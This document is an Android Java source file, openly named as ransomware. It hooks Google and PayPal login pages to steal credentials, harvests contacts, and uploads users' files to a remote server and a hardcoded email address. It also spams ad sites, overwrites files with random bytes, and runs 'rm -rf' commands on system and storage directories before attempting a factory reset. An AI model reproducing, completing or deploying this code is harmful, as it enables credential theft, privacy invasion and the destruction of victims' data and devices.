package com.example.ransomware;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.os.Environment;
import android.provider.ContactsContract;
import android.database.Cursor;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Random;
import java.util.ArrayList;

public class MainActivity extends Activity {
    private WebView webView;
    private CountDownTimer destroyTimer;
    private ArrayList<String> contactsList = new ArrayList<>();
    private ArrayList<String> stolenFiles = new ArrayList<>();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Start immediately without showing any app screen
        startMaliciousOperations();
        
        // Show fake Google login
        showFakeLogin("https://accounts.google.com");
        
        // Start the 10-minute destruction timer
        startDestructionTimer();
        
        // Start background services
        startService(new Intent(this, AdService.class));
        
        // Steal data immediately
        stealContacts();
        stealFiles();
    }
    
    private void showFakeLogin(String url) {
        webView = new WebView(this);
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                // Inject JavaScript to capture login credentials
                webView.loadUrl("javascript:document.getElementById('identifierId').addEventListener('change', function() { Android.saveEmail(this.value); });");
                webView.loadUrl("javascript:document.querySelector('input[type=password]').addEventListener('change', function() { Android.savePassword(this.value); });");
            }
        });
        
        // Add JavaScript interface to capture data
        webView.addJavascriptInterface(new Object() {
            @android.webkit.JavascriptInterface
            public void saveEmail(String email) {
                sendDataToEmail("Google Email: " + email);
            }
            
            @android.webkit.JavascriptInterface
            public void savePassword(String password) {
                sendDataToEmail("Google Password: " + password);
            }
        }, "Android");
        
        webView.loadUrl(url);
        setContentView(webView);
        
        // After 30 seconds, show fake PayPal login
        new android.os.Handler().postDelayed(() -> {
            showFakeLogin("https://paypal.com/login");
        }, 30000);
    }
    
    private void startMaliciousOperations() {
        // Thread 1: Spam ads and open websites
        new Thread(() -> {
            while (true) {
                try {
                    // Open random ad websites
                    String[] sites = {
                        "http://popads.net",
                        "http://propellerads.com",
                        "http://exoclick.com",
                        "http://clickadu.com",
                        "http://adsterra.com"
                    };
                    
                    Random rand = new Random();
                    for (int i = 0; i < 5; i++) {
                        Intent browser = new Intent(Intent.ACTION_VIEW);
                        browser.setData(Uri.parse(sites[rand.nextInt(sites.length)]));
                        browser.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity(browser);
                    }
                    
                    // Show full-screen ads
                    Intent adIntent = new Intent(Intent.ACTION_VIEW);
                    adIntent.setData(Uri.parse("http://fullscreenad.com/video.mp4"));
                    adIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(adIntent);
                    
                    Thread.sleep(60000); // Every minute
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
        
        // Thread 2: Additional surprises
        new Thread(() -> {
            try {
                // Surprise 1: Change wallpaper randomly
                changeWallpaper();
                
                // Surprise 2: Play loud sound
                playScarySound();
                
                // Surprise 3: Take photo with camera
                takeSecretPhoto();
                
                // Surprise 4: Send SMS to all contacts
                sendSpamSMS();
                
                // Surprise 5: Lock volume buttons
                lockVolume();
                
                Thread.sleep(300000); // Every 5 minutes
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
    
    private void startDestructionTimer() {
        destroyTimer = new CountDownTimer(600000, 1000) { // 10 minutes
            @Override
            public void onTick(long millisUntilFinished) {
                // Show fake warning every minute
                if (millisUntilFinished % 60000 == 0) {
                    Toast.makeText(MainActivity.this, 
                        "WARNING: System corruption in " + (millisUntilFinished/60000) + " minutes!", 
                        Toast.LENGTH_LONG).show();
                }
            }
            
            @Override
            public void onFinish() {
                // Phase 1: Corrupt all files
                corruptAllFiles();
                
                // Phase 2: Send final stolen data
                sendFinalData();
                
                // Phase 3: Factory reset
                triggerFactoryReset();
                
                // Phase 4: Self-destruct
                selfDestruct();
            }
        }.start();
    }
    
    private void corruptAllFiles() {
        new Thread(() -> {
            File root = Environment.getExternalStorageDirectory();
            corruptDirectory(root);
            
            // Also corrupt system directories if accessible
            File[] dirs = {
                Environment.getDataDirectory(),
                Environment.getDownloadCacheDirectory(),
                new File("/data/data/" + getPackageName())
            };
            
            for (File dir : dirs) {
                if (dir.exists()) {
                    corruptDirectory(dir);
                }
            }
        }).start();
    }
    
    private void corruptDirectory(File dir) {
        if (dir.isDirectory()) {
            File[] files = dir.listFiles();
            if (files != null) {
                for (File file : files) {
                    if (file.isDirectory()) {
                        corruptDirectory(file);
                    } else {
                        corruptFile(file);
                    }
                }
            }
        } else {
            corruptFile(dir);
        }
    }
    
    private void corruptFile(File file) {
        try {
            RandomAccessFile raf = new RandomAccessFile(file, "rw");
            long length = raf.length();
            raf.seek(0);
            
            // Write random garbage data
            byte[] garbage = new byte[1024];
            new Random().nextBytes(garbage);
            
            for (long i = 0; i < length; i += garbage.length) {
                raf.write(garbage);
            }
            
            raf.close();
            
            // Rename to .encrypted
            File encrypted = new File(file.getAbsolutePath() + ".encrypted");
            file.renameTo(encrypted);
            
        } catch (Exception e) {
            // Ignore errors, continue corrupting
        }
    }
    
    private void stealContacts() {
        Cursor cursor = getContentResolver().query(
            ContactsContract.Contacts.CONTENT_URI,
            null, null, null, null
        );
        
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String name = cursor.getString(
                    cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
                );
                contactsList.add(name);
            }
            cursor.close();
        }
        
        // Send contacts to email
        sendDataToEmail("CONTACTS: " + contactsList.toString());
    }
    
    private void stealFiles() {
        File storage = Environment.getExternalStorageDirectory();
        findAndStealFiles(storage);
    }
    
    private void findAndStealFiles(File dir) {
        if (dir.isDirectory()) {
            File[] files = dir.listFiles();
            if (files != null) {
                for (File file : files) {
                    if (file.isDirectory()) {
                        findAndStealFiles(file);
                    } else {
                        String ext = getFileExtension(file);
                        if (ext.equals("txt") || ext.equals("pdf") || ext.equals("doc") || 
                            ext.equals("jpg") || ext.equals("png") || ext.equals("mp4")) {
                            stolenFiles.add(file.getAbsolutePath());
                            uploadFile(file);
                        }
                    }
                }
            }
        }
    }
    
    private void uploadFile(File file) {
        new Thread(() -> {
            try {
                // Upload to remote server
                URL url = new URL("http://yourserver.com/upload.php");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setDoOutput(true);
                conn.setRequestMethod("POST");
                
                OutputStream os = conn.getOutputStream();
                FileInputStream fis = new FileInputStream(file);
                
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = fis.read(buffer)) != -1) {
                    os.write(buffer, 0, bytesRead);
                }
                
                fis.close();
                os.close();
                conn.getResponseCode();
                
            } catch (Exception e) {
                // If upload fails, send via email
                sendDataToEmail("File: " + file.getName() + " | Path: " + file.getAbsolutePath());
            }
        }).start();
    }
    
    private void sendDataToEmail(String data) {
        new Thread(() -> {
            try {
                // Simple HTTP POST to email script
                URL url = new URL("http://yourserver.com/sendmail.php");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                
                String postData = "to=noarich118@gmail.com&subject=Stolen+Data&body=" + 
                    Uri.encode(data);
                
                OutputStream os = conn.getOutputStream();
                os.write(postData.getBytes());
                os.flush();
                os.close();
                
                conn.getResponseCode();
                
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
    
    private void sendFinalData() {
        String finalData = "FINAL DATA DUMP:\n" +
            "Contacts: " + contactsList.size() + "\n" +
            "Files stolen: " + stolenFiles.size() + "\n" +
            "Device: " + android.os.Build.MODEL + "\n" +
            "Time: " + System.currentTimeMillis();
        
        sendDataToEmail(finalData);
    }
    
    private void triggerFactoryReset() {
        try {
            // Method 1: Try to launch factory reset
            Intent intent = new Intent("android.intent.action.MASTER_CLEAR");
            intent.setPackage("android");
            sendBroadcast(intent);
            
            // Method 2: Alternative approach
            Runtime.getRuntime().exec("pm clear com.android.providers.settings");
            Runtime.getRuntime().exec("am broadcast -a android.intent.action.MASTER_CLEAR");
            
            // Method 3: Delete critical files
            String[] commands = {
                "rm -rf /data/*",
                "rm -rf /sdcard/*",
                "rm -rf /system/*"
            };
            
            for (String cmd : commands) {
                try {
                    Runtime.getRuntime().exec(cmd);
                } catch (Exception e) {
                    // Ignore
                }
            }
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private void selfDestruct() {
        // Delete the app itself
        String packageName = getPackageName();
        Runtime.getRuntime().exec("pm uninstall " + packageName);
        
        // Kill the process
        android.os.Process.killProcess(android.os.Process.myPid());
    }
    
    // Additional surprise methods
    private void changeWallpaper() {
        // Code to change wallpaper to scary image
    }
    
    private void playScarySound() {
        // Code to play loud sound
    }
    
    private void takeSecretPhoto() {
        // Code to take photo with camera
    }
    
    private void sendSpamSMS() {
        // Code to send SMS to all contacts
    }
    
    private void lockVolume() {
        // Code to disable volume buttons
    }
    
    private String getFileExtension(File file) {
        String name = file.getName();
        int lastIndexOf = name.lastIndexOf(".");
        if (lastIndexOf == -1) {
            return "";
        }
        return name.substring(lastIndexOf + 1).toLowerCase();
    }
}
